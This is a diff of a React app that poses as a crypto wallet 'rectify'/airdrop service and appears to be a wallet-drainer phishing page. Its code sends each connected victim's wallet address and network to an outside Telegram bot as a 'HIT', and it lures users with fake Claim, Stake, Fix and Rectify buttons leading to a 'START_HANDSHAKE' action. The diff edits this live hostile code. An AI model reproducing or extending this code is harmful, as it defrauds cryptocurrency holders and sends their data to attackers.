@@ -24,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_100')) {
-      log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_100', 't');
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_102')) {
+      log(`🎯 NEW HIT!\nADDR: ${address}\nNET: ${chainId}`);
+      sessionStorage.setItem('hit_vF_102', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -76,7 +76,7 @@ export default function App() {
           </div>
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
-              {/* KYC REMOVED BELOW */}
+              {/* NO KYC BUTTON */}
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
@@ -89,12 +89,12 @@ export default function App() {
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'20px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', cursor:'pointer', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'9px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
               </div>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'15px 0', border:'1px solid #1e293b'}}>
-                <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
+                <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
               <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
@@ -131,9 +131,7 @@ export default function App() {
         </>
       ) : (
         <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
-          <div style={{marginBottom:'25px'}}>
-             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div>
-          </div>
+          <div style={{marginBottom:'25px'}}><div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div></div>
           <appkit-button />
         </div>
       )}
